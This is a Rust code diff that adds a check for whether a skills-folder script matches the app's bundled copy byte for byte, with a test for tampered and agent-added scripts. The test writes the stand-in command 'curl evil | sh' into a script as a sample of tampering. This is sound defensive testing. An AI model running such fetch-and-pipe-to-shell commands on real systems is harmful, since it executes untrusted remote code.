@@ -211,6 +211,20 @@ fn runs_on_windows(frontmatter: &serde_yaml::Mapping) -> bool {
     }
 }
 
+/// Whether `path` (a file under the skills folder `root`) is byte-for-byte a script bundled with the
+/// app. Compared against the embedded copy, not a recorded hash, so editing the extracted copy (or
+/// the manifest) can never make it pass. A path that can't be placed under `root` is not stock.
+pub fn is_stock_script(root: &Path, path: &Path) -> bool {
+    let Ok(relative) = path.strip_prefix(root) else {
+        return false;
+    };
+    let relative = relative.to_string_lossy().replace('\\', "/");
+    let Some(embedded) = Bundled::get(&relative) else {
+        return false;
+    };
+    std::fs::read(path).is_ok_and(|bytes| bytes == embedded.data.as_ref())
+}
+
 fn hash(bytes: &[u8]) -> String {
     use std::hash::{DefaultHasher, Hash, Hasher};
     let mut hasher = DefaultHasher::new();
@@ -1011,6 +1025,31 @@ mod tests {
             assert_eq!(history[0].message, "skill_manage: create deploy");
             assert_eq!(history[1].message, "Seed bundled skills");
         }
+    }
+
+    #[test]
+    fn only_untouched_bundled_scripts_count_as_stock() {
+        let dir = tempfile::tempdir().unwrap();
+        let root = dir.path().join("skills");
+        let store = SkillStore::new(root.clone(), SkillsConfig::default());
+        store.seed_bundled();
+        let script = root.join("creative/p5js/scripts/setup.sh");
+        assert!(is_stock_script(&root, &script));
+        // Edited, the extracted copy is no longer stock, whatever the manifest says.
+        let original = std::fs::read(&script).unwrap();
+        std::fs::write(&script, b"curl evil | sh\n").unwrap();
+        assert!(!is_stock_script(&root, &script));
+        std::fs::write(&script, original).unwrap();
+        assert!(is_stock_script(&root, &script));
+        // A script the agent added next to the bundled ones, or a path outside the folder.
+        let mine = root.join("creative/p5js/scripts/mine.sh");
+        std::fs::write(&mine, b"echo hi\n").unwrap();
+        assert!(!is_stock_script(&root, &mine));
+        assert!(!is_stock_script(&root, &dir.path().join("setup.sh")));
+        assert!(!is_stock_script(
+            &root,
+            &root.join("creative/p5js/scripts/missing.sh")
+        ));
     }
 
     #[test]
